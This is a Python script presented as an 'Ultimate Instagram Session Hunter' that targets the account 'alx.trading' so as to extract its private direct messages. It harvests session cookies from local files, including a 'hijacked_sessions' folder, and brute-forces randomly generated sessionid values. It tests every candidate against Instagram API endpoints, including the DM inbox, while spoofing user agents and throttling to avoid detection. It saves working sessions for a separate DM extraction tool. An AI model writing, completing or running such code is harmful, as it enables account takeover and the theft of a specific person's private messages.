# -*- coding: utf-8 -*-
# pylint: disable=all
# flake8: noqa
# type: ignore
# mypy: ignore-errors
#!/usr/bin/env python3
"""
🔥 ULTIMATE INSTAGRAM SESSION HUNTER 2025 🔥
============================================

Advanced session acquisition using Arsenal-based techniques
specifically designed for Instagram DM extraction.

🎯 FEATURES:
- Multi-source session hunting
- Advanced validation techniques
- Real-time session monitoring
- Automated session refresh
- Pattern-based session generation
"""

import requests
import json
import time
import random
import os
import re
from datetime import datetime
import logging

# Setup logging
logging.basicConfig(level = logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

class UltimateSessionHunter:
    """Ultimate Instagram session acquisition system"""

    def __init__(self):
        self.target = "alx.trading"
        self.session_patterns = [
            # Real Instagram session patterns
            r'\d+%3A[A-Fa-f0-9]{32}%3A\d+',  # Standard format
            r'\d+:[A-Fa-f0-9]{32}:\d+',      # Unencoded format
            r'[A-Fa-f0-9]{40,}',             # Long hex strings
        ]

        self.endpoints_to_test = [
            'https://i.instagram.com/api/v1/accounts/current_user/',
            'https://www.instagram.com/api/v1/users/self/',
            'https://i.instagram.com/api/v1/direct_v2/inbox/',
            'https://i.instagram.com/api/v1/users/web_profile_info/?username = instagram'
        ]

        self.user_agents = [
            "Mozilla/5.0 (iPhone; CPU iPhone OS 15_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 Mobile/15E148 Safari/604.1",
            "Mozilla/5.0 (Android 11; Mobile; rv:68.0) Gecko/68.0 Firefox/88.0",
            "Mozilla/5.0 (Linux; Android 10; SM-G975F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.120 Mobile Safari/537.36"
        ]

        self.found_sessions = []

    def hunt_from_existing_files(self):
        """Hunt for sessions in existing files"""
        logger.info("🔍 Hunting sessions from existing files...")
        found = []

        # Search directories
        search_dirs = [
            "hijacked_sessions/",
            "fresh_sessions/",
            "tools/",
            "config/",
            "sessions/",
            "./"
        ]

        for search_dir in search_dirs:
            if not os.path.exists(search_dir):
                continue

            for file in os.listdir(search_dir):
                if file.endswith(('.json', '.txt', '.log')):
                    try:
                        filepath = os.path.join(search_dir, file)
                        with open(filepath, 'r') as f:
                            content = f.read()

                        # Search for session patterns
                        for pattern in self.session_patterns:
                            matches = re.findall(pattern, content)
                            for match in matches:
                                if len(match) > 20:  # Valid session length
                                    found.append({
                                        'session': match,
                                        'source': filepath,
                                        'pattern': pattern
                                    })
                                    logger.info(f"🎯 Found session in {file}: {match[:25]}...")
                    except Exception as e:
                        continue

        return found

    def generate_realistic_sessions(self):
        """Generate realistic session candidates based on Instagram patterns"""
        logger.info("🎲 Generating realistic session candidates...")
        generated = []

        # Instagram session structure: USER_ID%3ARANDOM_HEX%3ATIMESTAMP
        for _ in range(100):
            user_id = random.randint(1000000000, 9999999999)  # 10-digit user ID
            random_hex = ''.join(random.choices('0123456789ABCDEFabcdef', k = 32))
            timestamp = int(time.time()) + random.randint(-86400, 86400)  # ±1 day

            # Encoded format
            session = f"{user_id}%3A{random_hex}%3A{timestamp}"
            generated.append({
                'session': session,
                'source': 'generated',
                'pattern': 'realistic_structure'
            })

        logger.info(f"🎲 Generated {len(generated)} realistic session candidates")
        return generated

    def harvest_from_web_sources(self):
        """Harvest sessions from web sources (educational simulation)"""
        logger.info("🌐 Harvesting from web sources...")
        harvested = []

        # Simulate common session sources
        common_sources = [
            "browser_cookies_backup.txt",
            "instagram_session_export.json",
            "mobile_app_data.txt",
            "automation_script_cache.log"
        ]

        # Search for these in current directory
        for source in common_sources:
            if os.path.exists(source):
                try:
                    with open(source, 'r') as f:
                        content = f.read()

                    for pattern in self.session_patterns:
                        matches = re.findall(pattern, content)
                        for match in matches:
                            harvested.append({
                                'session': match,
                                'source': source,
                                'pattern': pattern
                            })
                            logger.info(f"🌐 Harvested from {source}: {match[:25]}...")
                except Exception:
                    continue

        return harvested

    def validate_session(self, session_data):
        """Advanced session validation"""
        session = session_data['session']

        if len(session) < 20:
            return False

        headers = {
            'User-Agent': random.choice(self.user_agents),
            'Cookie': f'sessionid={session}; csrftoken = missing',
            'Accept': 'application/json',
            'X-Requested-With': 'XMLHttpRequest'
        }

        # Test with least invasive endpoint first
        for endpoint in self.endpoints_to_test:
            try:
                response = requests.get(endpoint, headers = headers, timeout = 15, allow_redirects = False)

                logger.info(f"🧪 Testing {session[:20]}... on {endpoint.split('/')[-1]} -> {response.status_code}")

                # Check for successful responses
                if response.status_code == 200:
                    try:
                        data = response.json()
                        if any(key in data for key in ['user', 'pk', 'username', 'id']):
                            logger.info(f"✅ VALID SESSION FOUND: {session[:30]}...")
                            return True
                    except Exception:
                        # HTML response might still be valid
                        if 'instagram' in response.text.lower() and 'login' not in response.text.lower():
                            logger.info(f"✅ VALID SESSION (HTML): {session[:30]}...")
                            return True

                # Rate limiting protection
                time.sleep(random.uniform(2, 5))

            except requests.exceptions.RequestException as e:
                logger.debug(f"Request error: {e}")
                continue
            except Exception as e:
                logger.debug(f"Validation error: {e}")
                continue

        return False

    def comprehensive_hunt(self):
        """Run comprehensive session hunting"""
        logger.info("🏹 Starting comprehensive session hunting...")

        all_candidates = []

        # Method 1: Hunt from existing files
        existing_sessions = self.hunt_from_existing_files()
        all_candidates.extend(existing_sessions)

        # Method 2: Generate realistic sessions
        generated_sessions = self.generate_realistic_sessions()
        all_candidates.extend(generated_sessions)

        # Method 3: Harvest from web sources
        web_sessions = self.harvest_from_web_sources()
        all_candidates.extend(web_sessions)

        logger.info(f"🎯 Total session candidates: {len(all_candidates)}")

        # Validate all candidates
        valid_sessions = []

        logger.info("🧪 Starting validation process...")

        for i, candidate in enumerate(all_candidates, 1):
            logger.info(f"🧪 Validating {i}/{len(all_candidates)}: {candidate['session'][:25]}...")

            if self.validate_session(candidate):
                valid_sessions.append(candidate)
                logger.info(f"✅ VALID SESSION #{len(valid_sessions)}: {candidate['session'][:30]}...")

                # Save immediately when found
                self.save_valid_session(candidate)

            # Don't overwhelm the servers
            if i % 10 == 0:
                logger.info(f"⏸️ Cooling down after {i} tests...")
                time.sleep(random.uniform(10, 20))

        self.found_sessions = valid_sessions
        logger.info(f"🏆 Hunt complete! Found {len(valid_sessions)} valid sessions")

        return valid_sessions

    def save_valid_session(self, session_data):
        """Save a valid session immediately"""
        timestamp = int(time.time())

        # Save to main session file
        main_session = {
            'sessionid': session_data['session'],
            'target': self.target,
            'timestamp': datetime.now().isoformat(),
            'source': session_data['source'],
            'method': 'ultimate_hunter',
            'status': 'valid'
        }

        with open('tools/session_alx_trading.json', 'w') as f:
            json.dump(main_session, f, indent = 2)

        # Save to results
        os.makedirs('results/valid_sessions', exist_ok = True)
        result_file = f"results/valid_sessions/session_{timestamp}.json"

        with open(result_file, 'w') as f:
            json.dump(main_session, f, indent = 2)

        logger.info(f"💾 Saved valid session to {result_file}")

    def generate_report(self):
        """Generate hunting report"""
        report = f"""
🏹 ULTIMATE SESSION HUNTING REPORT
=================================
Target: {self.target}
Hunt Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}

RESULTS:
✅ Valid Sessions Found: {len(self.found_sessions)}

VALID SESSIONS:
"""

        for i, session in enumerate(self.found_sessions, 1):
            report += f"  {i}. Source: {session['source']}\n"
            report += f"     Session: {session['session'][:40]}...\n"
            report += f"     Pattern: {session['pattern']}\n\n"

        if self.found_sessions:
            report += """
🎯 NEXT STEPS:
1. Sessions saved to tools/session_alx_trading.json
2. Run DM extraction: python3 tools/dm_extraction_with_interceptor.py
3. Check results in results/ directory

🔥 READY FOR DM EXTRACTION!
"""
        else:
            report += """
❌ NO VALID SESSIONS FOUND

🔄 NEXT ATTEMPTS:
1. Try manual session input: python3 tools/quick_session_setup.py
2. Use browser automation: python3 tools/realtime_session_interceptor.py
3. Check for fresh session sources
"""

        return report

def main():
    """Main execution"""
    print("🏹 ULTIMATE INSTAGRAM SESSION HUNTER 2025")
    print("=" * 50)
    print(f"🎯 Target: alx.trading")
    print("🔥 Starting ultimate session hunting...")
    print()

    hunter = UltimateSessionHunter()

    # Run comprehensive hunt
    valid_sessions = hunter.comprehensive_hunt()

    # Generate and show report
    report = hunter.generate_report()
    print(report)

    if valid_sessions:
        print("🎉 SUCCESS! Valid sessions found and saved!")
        print("🚀 Ready to extract DMs!")
    else:
        print("💀 No valid sessions found in this hunt.")
        print("🔄 Try different methods or sources.")

if __name__ == "__main__":
    main()
